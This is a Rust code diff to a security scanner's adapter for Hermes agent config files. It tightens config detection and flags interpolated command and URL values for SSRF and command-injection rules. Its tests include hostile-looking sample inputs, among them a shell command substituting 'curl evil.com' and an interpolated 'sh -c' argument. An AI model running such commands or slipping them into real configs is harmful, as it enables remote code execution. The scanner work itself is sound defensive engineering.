@@ -7,6 +7,9 @@
 
 use std::path::{Path, PathBuf};
 
+use once_cell::sync::Lazy;
+use regex::Regex;
+
 use crate::analysis::cross_file::apply_cross_file_sanitization;
 use crate::analysis::sensitivity::looks_sensitive_name;
 use crate::config::ScanPathFilter;
@@ -32,12 +35,18 @@ impl super::Adapter for HermesAgentAdapter {
     }
 
     fn detect(&self, root: &Path) -> bool {
-        root.join(".hermes.md").exists()
-            || looks_like_hermes_config(&root.join("config.yaml"))
-            || looks_like_hermes_config(&root.join(".hermes").join("config.yaml"))
+        let has_other_hermes_artifact = root.join(".hermes.md").exists()
             || has_profile_config(root)
             || has_hermes_skill_tree(root)
-            || has_optional_mcp_catalog(root)
+            || has_optional_mcp_catalog(root);
+
+        // `.hermes/config.yaml` is a Hermes-specific path, so `model:` alone
+        // is trusted there. A bare top-level `config.yaml` is generic enough
+        // (ML/CI configs use `model:` too) that `model:` only counts when
+        // paired with another Hermes artifact already found above.
+        has_other_hermes_artifact
+            || looks_like_hermes_config(&root.join("config.yaml"), has_other_hermes_artifact)
+            || looks_like_hermes_config(&root.join(".hermes").join("config.yaml"), true)
     }
 
     fn load(&self, root: &Path, ignore_tests: bool) -> Result<Vec<ScanTarget>> {
@@ -102,17 +111,64 @@ impl super::Adapter for HermesAgentAdapter {
     }
 }
 
-fn looks_like_hermes_config(path: &Path) -> bool {
+/// Classify a Hermes config scalar (a `command:`/`url:` value, after
+/// argument-list expansion) as `Interpolated` when it contains a template
+/// or environment placeholder, or `Literal` otherwise.
+///
+/// Hermes configs commonly reference runtime values via `${VAR}`, `$VAR`,
+/// `{{var}}`, or backtick shell substitution. A plain literal like
+/// `https://api.example.com` is genuinely static and should not be treated
+/// as attacker-controlled, but a value like `"{{base_url}}/api"` resolves
+/// at Hermes runtime and deserves the same scrutiny as a source-code
+/// string built from a tainted variable.
+fn classify_config_value(value: &str) -> ArgumentSource {
+    if contains_config_interpolation(value) {
+        ArgumentSource::Interpolated
+    } else {
+        ArgumentSource::Literal(value.to_string())
+    }
+}
+
+static INTERPOLATION_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r"\$\{[^}]+\}|\$\w+|\{\{[^}]+\}\}|`[^`]+`").expect("static regex pattern is valid")
+});
+
+fn contains_config_interpolation(value: &str) -> bool {
+    INTERPOLATION_RE.is_match(value)
+}
+
+/// Does this YAML file look like a Hermes config?
+///
+/// `mcp_servers`/`skills`/`terminal`/`gateway`/`sessions` are strong,
+/// Hermes-specific top-level keys. `model` alone is too generic (ML/CI
+/// configs use it too) and is only trusted when `trust_model_alone` is set
+/// by the caller — i.e. the path itself is Hermes-specific (`.hermes/`,
+/// `profiles/*/`) or another Hermes artifact was already found.
+fn looks_like_hermes_config(path: &Path, trust_model_alone: bool) -> bool {
     let Ok(content) = std::fs::read_to_string(path) else {
         return false;
     };
 
-    content.contains("mcp_servers:")
-        || content.contains("skills:")
-        || content.contains("terminal:")
-        || content.contains("gateway:")
-        || content.contains("sessions:")
-        || content.contains("model:")
+    has_top_level_key(&content, "mcp_servers")
+        || has_top_level_key(&content, "skills")
+        || has_top_level_key(&content, "terminal")
+        || has_top_level_key(&content, "gateway")
+        || has_top_level_key(&content, "sessions")
+        || (trust_model_alone && has_top_level_key(&content, "model"))
+}
+
+/// Does `content` contain `key:` as an unindented, uncommented top-level
+/// YAML mapping key? Avoids matching the key inside comments, nested
+/// mappings, or string values.
+fn has_top_level_key(content: &str, key: &str) -> bool {
+    content.lines().any(|line| {
+        !line.starts_with(' ')
+            && !line.starts_with('\t')
+            && line
+                .trim_start()
+                .strip_prefix(key)
+                .is_some_and(|rest| rest.starts_with(':'))
+    })
 }
 
 fn has_profile_config(root: &Path) -> bool {
@@ -123,7 +179,7 @@ fn has_profile_config(root: &Path) -> bool {
 
     entries
         .flatten()
-        .any(|entry| looks_like_hermes_config(&entry.path().join("config.yaml")))
+        .any(|entry| looks_like_hermes_config(&entry.path().join("config.yaml"), true))
 }
 
 fn has_hermes_skill_tree(root: &Path) -> bool {
@@ -368,7 +424,7 @@ fn parse_mcp_servers_from_yaml(
             };
             execution.commands.push(CommandInvocation {
                 function: command,
-                command_arg: ArgumentSource::Literal(full_command),
+                command_arg: classify_config_value(&full_command),
                 location: location.clone(),
             });
         }
@@ -376,7 +432,7 @@ fn parse_mcp_servers_from_yaml(
         if let Some(url) = server.url {
             execution.network_operations.push(NetworkOperation {
                 function: "hermes.mcp.http".into(),
-                url_arg: ArgumentSource::Literal(url),
+                url_arg: classify_config_value(&url),
                 method: None,
                 sends_data: true,
                 location: location.clone(),
@@ -561,6 +617,51 @@ mod tests {
     }
 
     #[test]
+    fn test_bare_model_key_alone_does_not_detect_hermes() {
+        let temp = tempfile::tempdir().unwrap();
+        std::fs::write(temp.path().join("config.yaml"), "model: gpt-4\n").unwrap();
+
+        let adapter = HermesAgentAdapter;
+        assert!(
+            !adapter.detect(temp.path()),
+            "a generic config.yaml with only `model:` should not be detected as Hermes"
+        );
+    }
+
+    #[test]
+    fn test_model_key_under_hermes_dir_detects_hermes() {
+        let temp = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(temp.path().join(".hermes")).unwrap();
+        std::fs::write(
+            temp.path().join(".hermes").join("config.yaml"),
+            "model: gpt-4\n",
+        )
+        .unwrap();
+
+        let adapter = HermesAgentAdapter;
+        assert!(
+            adapter.detect(temp.path()),
+            ".hermes/config.yaml with `model:` should be detected as Hermes"
+        );
+    }
+
+    #[test]
+    fn test_mcp_servers_key_detects_hermes() {
+        let temp = tempfile::tempdir().unwrap();
+        std::fs::write(
+            temp.path().join("config.yaml"),
+            "mcp_servers:\n  svc:\n    command: npx\n",
+        )
+        .unwrap();
+
+        let adapter = HermesAgentAdapter;
+        assert!(
+            adapter.detect(temp.path()),
+            "a config.yaml with `mcp_servers:` should be detected as Hermes"
+        );
+    }
+
+    #[test]
     fn test_load_hermes_framework() {
         let adapter = HermesAgentAdapter;
         let targets = adapter.load(&fixture_dir(), false).unwrap();
@@ -605,5 +706,77 @@ mod tests {
             env.is_sensitive
                 && matches!(&env.var_name, ArgumentSource::Literal(name) if name == "header:Authorization")
         }));
+    }
+
+    #[test]
+    fn test_classify_config_value_plain_literal() {
+        assert_eq!(
+            classify_config_value("https://api.example.com"),
+            ArgumentSource::Literal("https://api.example.com".into())
+        );
+        assert_eq!(
+            classify_config_value("npx -y @modelcontextprotocol/server-filesystem"),
+            ArgumentSource::Literal("npx -y @modelcontextprotocol/server-filesystem".into())
+        );
+    }
+
+    #[test]
+    fn test_classify_config_value_detects_interpolation() {
+        for value in [
+            "${MCP_URL}",
+            "$MCP_URL",
+            "{{base_url}}/api",
+            "sh -c `curl evil.com`",
+        ] {
+            assert_eq!(
+                classify_config_value(value),
+                ArgumentSource::Interpolated,
+                "{value} should be classified as Interpolated"
+            );
+        }
+    }
+
+    fn run_rule_on_hermes_config(rule_id: &str, content: &str) -> Vec<crate::rules::Finding> {
+        let temp = tempfile::tempdir().unwrap();
+        std::fs::write(temp.path().join("config.yaml"), content).unwrap();
+
+        let adapter = HermesAgentAdapter;
+        let targets = adapter.load(temp.path(), false).unwrap();
+        crate::rules::builtin::all_detectors()
+            .into_iter()
+            .find(|d| d.metadata().id == rule_id)
+            .unwrap_or_else(|| panic!("no detector registered for {rule_id}"))
+            .run(&targets[0])
+    }
+
+    #[test]
+    fn test_literal_url_does_not_trigger_ssrf() {
+        let content = "mcp_servers:\n  svc:\n    url: https://api.example.com\n";
+        let findings = run_rule_on_hermes_config("SHIELD-003", content);
+        assert!(
+            findings.is_empty(),
+            "a plain literal URL should not trigger SHIELD-003, got {findings:?}"
+        );
+    }
+
+    #[test]
+    fn test_interpolated_url_triggers_ssrf() {
+        let content = "mcp_servers:\n  svc:\n    url: \"{{base_url}}/api\"\n";
+        let findings = run_rule_on_hermes_config("SHIELD-003", content);
+        assert!(
+            !findings.is_empty(),
+            "an interpolated URL should trigger SHIELD-003"
+        );
+    }
+
+    #[test]
+    fn test_interpolated_command_arg_triggers_command_injection() {
+        let content =
+            "mcp_servers:\n  svc:\n    command: sh\n    args: [\"-c\", \"${USER_CMD}\"]\n";
+        let findings = run_rule_on_hermes_config("SHIELD-001", content);
+        assert!(
+            !findings.is_empty(),
+            "an interpolated command arg should trigger SHIELD-001"
+        );
     }
 }
